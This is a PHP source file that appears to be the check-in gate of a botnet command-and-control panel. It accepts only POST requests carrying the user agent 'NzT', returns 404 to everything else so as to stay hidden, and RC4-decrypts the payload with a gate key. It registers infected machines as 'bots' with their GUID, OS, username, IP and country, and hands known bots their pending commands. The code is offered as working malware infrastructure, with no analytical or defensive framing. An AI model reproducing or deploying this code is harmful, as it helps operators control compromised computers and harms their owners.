<?php
ob_start();
require_once('inc/config.php');
require_once('inc/const.php');
require_once('inc/utils.php');
require_once('inc/db.php');

if($_SERVER['HTTP_USER_AGENT'] != 'NzT') error404();
if($_SERVER['REQUEST_METHOD'] != 'POST') error404();

$post_data = file_get_contents('php://input');

//echo $post_data;

if (!$post_data)
    error404();

$decrypt = RC4($post_data, $CONST_GATE_KEY);

$data  = array();
$token = explode('&', $post_data);

for($i = 0; $i < count($token); $i++)
{
   $value = explode('=', $token[$i]);
   $data[$value[0]] = $value[1];
}

if (!isset($data['type']) || !isset($data['guid']) ||
    !isset($data['os']) || !isset($data['arch']) ||
    !isset($data['username'])) 
   error404();

if($data['type'] == 'report')
{
   $db           = db(false);
   $ip           = get_ip();
   $ipLong       = sprintf('%u', ip2long($ip));
   $time         = time();
   $country      = get_country($ip);
   $last_command = '';

   $sql    = "SELECT guid FROM bots WHERE guid = ?";
   $stmt   = $db->prepare($sql);
   $status = $stmt->execute([$data['guid']]);

   if ($stmt->rowCount() > 0) // bot exists
   {
      //last command
      db_fetch_bot_last_command($db, $data['guid'], $last_command);
      db_fetch_tasks($db, $data['guid'], $last_command);
      db_update_bot($db, $data['guid'], $ipLong, $country, $last_command);
   }
   else // new bot
      db_add_bot($db, $data['guid'], $ipLong, $data['os'], $data['arch'], $data['username']);
}
?>